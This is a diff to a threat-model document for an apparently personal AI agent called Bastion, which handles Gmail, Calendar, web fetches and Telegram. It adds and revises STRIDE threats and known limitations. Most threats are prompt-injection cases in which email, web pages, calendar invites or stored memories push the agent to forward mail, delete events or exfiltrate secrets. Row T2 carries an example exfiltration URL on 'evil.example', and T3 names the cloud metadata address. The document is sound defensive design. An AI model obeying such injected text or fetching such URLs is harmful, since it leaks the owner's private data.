@@ -73,22 +73,22 @@ attendees) is either blocked or requires the owner's explicit, argument-bound ap
 
 | ID | Threat | STRIDE | Adversary | Controls |
 |---|---|---|---|---|
-| T1 | Injected email makes the agent forward private mail to the attacker | Info disclosure | A1 | Taint tracking (C2), policy escalation to approval (C1, C4), quarantined reader (C3) |
+| T1 | Injected email makes the agent forward private mail to the attacker | Info disclosure | A1 | Everything read from Gmail is untrusted and taints the conversation (C2); sending is a `send` action, offered only if the owner opted in, and once tainted it needs approval of the exact recipients and text (C1, C4, C9); by default the planner sees a quarantined reader's digest, not the email (C3); links in email never become fetchable (C7) |
 | T2 | Injected web page makes the agent fetch `https://evil.example/?d=<secrets>` | Info disclosure | A1 | URL-provenance rule: `web_fetch` only accepts URLs seen in search results or owner messages (C7) |
 | T3 | Agent tricked into fetching `http://169.254.169.254/` or LAN admin pages | Info disclosure / EoP | A1 | SSRF guard: resolve, reject private/loopback/link-local/reserved ranges, pin IP, re-check redirects (C7) |
-| T4 | Injected text makes the agent delete mail or calendar events | Tampering | A1 | `destructive` tier: approval plus TOTP step-up (C1, C4, C5) |
+| T4 | Injected text makes the agent delete mail or calendar events | Tampering | A1 | `destructive` tier: refused in a tainted conversation, otherwise approval plus TOTP step-up (C1, C4, C5); a deletion names the event, which code checks against the live event (C4); Bastion offers no way to delete email |
 | T5 | Owner approves "send to alice@" but the agent sends to someone else | Tampering | A1 | Approval bound to a hash of the exact tool arguments; single use; expiring (C4) |
 | T6 | Stranger commands the bot | Spoofing / EoP | A2 | Pairing needs a one-time code from the terminal *and* the owner's confirmation there, with a guess limit per sender; the owner (user and private chat) is kept in the OS keyring; every other user, group or chat is dropped without a reply and audited with a rate limit (C6) |
-| T7 | Hijacked Telegram approves high-risk actions | Spoofing | A3 | TOTP step-up for high-risk tiers, each code usable once; five wrong codes in an hour engage the kill switch (C5); `/stop` kill switch that only the computer can release (`bastion resume`); `bastion telegram unpair` stops a running bot at its next update (C6, C11) |
+| T7 | Hijacked Telegram approves high-risk actions | Spoofing | A3 | TOTP step-up for high-risk tiers and for sending email as the owner, each code usable once; five wrong codes in an hour engage the kill switch (C5); `/stop` kill switch that only the computer can release (`bastion resume`); `bastion telegram unpair` stops a running bot at its next update (C6, C11) |
 | T8 | Injected instruction stored in memory and replayed in every future session | Tampering (persistence) | A1 | Memory provenance bound into the ciphertext; tainted memories come back as untrusted data; caps on untrusted memories; trusted memories always rank first (C12) |
 | T9 | Secrets leak into logs, audit entries, or model context | Info disclosure | A1, A5 | Keyring-only storage (C8); redaction filter on all log and audit output (C8); tools never return credentials |
 | T10 | Token theft from disk | Info disclosure | A5 | OS keyring (C8); AES-GCM field encryption for sensitive DB fields (C13) |
-| T11 | Over-broad Google access amplifies any compromise | EoP | All | Minimal OAuth scopes; `gmail.send` opt-in (C9) |
+| T11 | Over-broad Google access amplifies any compromise | EoP | All | The owner's own OAuth client; an access level per service, each asking for the fewest scopes; the level used is the lower of what was requested and what was granted; sending mail is opt-in; no email deletion, settings or contacts access (C9) |
 | T12 | Owner cannot tell what the agent did, or evidence is edited | Repudiation | A1, A5 | HMAC-chained audit log in SQLite, append-only triggers, `bastion audit verify` (C10) |
 | T13 | Scheduled task loops, burns money, or drifts beyond its purpose | DoS / EoP | A1 | Capability grants, step/token/cost budgets, rate limits, kill switch (C11) |
 | T14 | Poisoned dependency | All | A4 | Hash-locked dependencies, minimal dependency tree, pip-audit, Dependabot, CodeQL, SBOM, signed releases (C14) |
 | T15 | Malicious tool-call arguments (wrong types, path tricks, header injection) | Tampering | A1 | Every tool's arguments validated by a strict Pydantic schema before policy evaluation |
-| T16 | Exposed network listener attacked | EoP | A2 | No inbound ports: Telegram long polling; the CLI runs in-process (no local IPC server) |
+| T16 | Exposed network listener attacked | EoP | A2 | No inbound ports: Telegram long polling; the CLI runs in-process (no local IPC server). The one exception is the loopback listener during `bastion google connect` (T27) |
 | T17 | Model output misleads the owner on screen: ANSI escapes rewrite the terminal, bidi or zero-width characters disguise an approval's recipient, link text hides the real URL | Spoofing | A1 | Replies shown with control characters stripped; approval prompts show them as visible `\uXXXX`; links rendered with their real URL (C16) |
 | T18 | Data exfiltrated through the chat channel itself: Telegram's servers fetch any URL in a bot message to build a link preview | Info disclosure | A1 | Link previews disabled on every outgoing message; plain text only, never Telegram markup (C16) |
 | T19 | Environment variables (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, proxy and certificate settings) or an HTTP redirect divert prompts and the API key | Info disclosure | A4, A5 | Base URLs always passed explicitly and required to be HTTPS (HTTP only for localhost); LLM and web clients ignore proxy/certificate environment variables; LLM clients never follow redirects (Anthropic's `x-api-key` header is not stripped on cross-origin redirects) (C7, C8) |
@@ -99,6 +99,11 @@ attendees) is either blocked or requires the owner's explicit, argument-bound ap
 | T24 | The bot token leaks (it sits in every Bot API URL) through request logs, error messages or a proxy, letting an attacker read or answer the owner's chat | Info disclosure / Spoofing | A4, A5 | Token only in the OS keyring and entered at a hidden prompt; HTTP request logging silenced; transport errors re-raised without their text or cause; proxy variables ignored; a second poller (409 Conflict) raises an alarm to revoke the token (C6, C8) |
 | T25 | Requests queued while Bastion was offline run hours later, when the owner no longer expects them | Tampering | A3 | The update backlog is discarded at startup; the owner is told so (C6) |
 | T26 | A hijacked account or a stuck client floods the bot, running up model costs | DoS | A2, A3 | One request at a time; a per-owner token bucket; strangers' audit entries capped per hour; `/stop` (C6, C11) |
+| T27 | During `bastion google connect`, another program or a web page interferes with the sign-in: plants its own authorization code (login CSRF), steals the code, or attacks the listener | Spoofing / Info disclosure | A5, web attacker | The listener binds 127.0.0.1 only, on a random port, only while connecting; it accepts one valid redirect, gives up after five minutes, caps request size and read time, and serves a static page; `state` (256 random bits) is compared in constant time; PKCE (S256) makes a stolen code useless (C9) |
+| T28 | An approval shows only an opaque id ("delete event abc123"), so the owner approves something other than they think | Tampering | A1 | Calendar changes and deletions name the event (its title and start); code checks them against the live event before acting and never echoes the live values; a whole recurring series is refused (only single occurrences change); the event's ETag (`If-Match`) makes Google refuse if it changed between that check and the write (C4) |
+| T29 | A calendar invitation carries an injection, or Bastion writes injected text into an event that later comes back as the owner's (persistence) | Tampering | A1 | Invitations, events guests can edit or add people to, and events Google made from email are untrusted; events Bastion writes in a tainted conversation are marked and stay untrusted; changing an event that has other guests is a `send` action the model must declare (`notify_guests`), checked against the live event; only events the owner organises can be changed (C1, C2, C12) |
+| T30 | Google access leaks or outlives its purpose: a stolen refresh token, an access token in a log, a disconnect that leaves a running daemon connected | Info disclosure | A4, A5 | Refresh token only in the OS keyring; access tokens only in memory and registered for redaction; request logging silenced; transport errors raised without their cause; the keyring is re-checked before each use, so `bastion google disconnect` (which also revokes at Google) stops a running daemon; reconnecting revokes the previous token (C8, C9) |
+| T31 | Crafted email (deep MIME nesting, huge bodies, odd charsets, forged threading headers) slows or crashes the agent, or smuggles headers into a reply | DoS / Tampering | A1 | Limits on MIME depth and part count, response size and text length; HTML converted off the event loop; unknown charsets fall back to UTF-8; Message-IDs copied into a reply only if well formed; recipients are bare ASCII addresses and subjects single lines (C7, T15) |
 
 ## 8. Controls index
 
@@ -159,6 +164,31 @@ Where each control lives in the code: [ARCHITECTURE.md](ARCHITECTURE.md#security
 - **Hidden-text stripping is best effort.** The HTML extractor drops text hidden with common
   techniques, but pages can hide text in ways it does not detect. Fetched pages therefore stay
   untrusted regardless.
+- **Google's drafting permission can also send.** Google has no drafts-only Gmail scope:
+  `gmail.compose` also permits sending. At the default level (`draft`) the token could send mail
+  if code running as the owner misused it (A4, A5); Bastion itself offers the model no way to
+  send unless the owner connects with `--gmail send`.
+- **The quarantined reader narrows the injection channel; it does not close it.** A summary of
+  hostile text can still carry hostile text, so digests stay untrusted, and taint, policy and
+  approvals remain the guarantee. The reader's tokens are not counted in the per-request budget
+  (each call is capped instead).
+- **Email and calendar content goes to the LLM provider**, like web pages and the owner's own
+  messages (see A6).
+- **Sign-ins in Google's "Testing" mode expire weekly.** External OAuth apps in testing get
+  refresh tokens that last seven days; the "Personal" audience avoids this.
+- **Sender domains are labels.** Taint sources such as `gmail:example.com` come from the `From`
+  header, which senders can forge. They tell the owner where text came from; they are never
+  treated as an identity.
+- **"Owner-written" relies on Google's flags.** An event counts as the owner's own if Google
+  says the owner organised and created it, it is an ordinary event, guests can neither edit it
+  nor add people to it, and Bastion did not mark it. An event the owner typed up from someone
+  else's text still counts as the owner's.
+- **A hijacked Telegram account can read what Bastion can read.** Step-up codes guard actions
+  (sending mail, deleting), not reading: someone holding the owner's Telegram session can ask
+  for email and calendar contents. `/stop` and `bastion telegram unpair` end that access.
+- **Search results are not quarantined.** `gmail_search` shows subjects, senders and snippets
+  as written (untrusted and fenced, like web search results); only opening an email goes
+  through the quarantined reader.
 - **Shell and code execution and browser automation** are deliberately excluded from v1.
 
 ## 10. How this document is kept honest
